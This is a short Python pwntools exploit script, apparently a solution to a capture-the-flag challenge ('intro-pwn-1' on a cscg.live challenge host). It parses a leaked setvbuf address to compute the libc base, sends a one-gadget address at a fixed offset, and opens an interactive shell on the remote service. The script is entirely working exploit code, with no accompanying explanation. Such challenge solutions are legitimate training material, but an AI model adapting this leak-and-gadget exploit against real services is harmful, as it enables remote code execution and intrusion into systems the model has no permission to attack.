from pwn import *

local = False

if local:
    # p = process("./pwn1", env={"LD_PRELOAD": "./libc6_2.19-0ubuntu6.7_amd64.so"})
    # p = process("./pwn1")
    p = remote("127.0.0.1", 31337)
else:
    p = remote("0c26bde9bf6a2671adbba9c5-intro-pwn-1.challenge.master.cscg.live", 31337, ssl=True)

libc = ELF("./libc.so.6")

msg = p.recvuntil(b"shot: ")

setvbuf_addr_leak = int(msg.split()[-4], 16)
libc.address = setvbuf_addr_leak - libc.symbols['setvbuf']
log.info("Libc address: " + hex(libc.address))

one_shot = libc.address + 0xebcf8

log.info("One shot address: " + hex(one_shot))

one_shot_str = bytes(hex(one_shot)[2:], "utf-8")
print(one_shot_str)
p.sendline(one_shot_str)

p.interactive()

